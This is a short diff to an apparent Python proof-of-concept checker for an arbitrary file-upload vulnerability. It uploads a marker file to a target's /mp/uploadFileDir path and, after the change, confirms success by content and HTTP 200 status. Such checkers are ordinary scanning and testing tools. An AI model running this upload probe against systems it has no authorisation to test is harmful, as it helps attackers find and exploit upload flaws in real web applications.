@@ -64,7 +64,7 @@ class poc:
             }
             result = requests.post(url=url, files=data, proxies=self.proxies, headers=headers, verify=False, timeout=3)
             end_result = requests.get("{}://{}/mp/uploadFileDir/{}.txt".format(scheme, netloc, payload), proxies=self.proxies, headers=self.headers, verify=False, timeout=3)
-            if payload in end_result.text:
+            if payload in end_result.text and end_result.status_code == 200:
                 target = urlparse(url)
                 self.result_text += """\n        [+]    \033[32m检测到目标站点存在任意文件上传漏洞\033[0m
                  POST {} HTTP/1.1
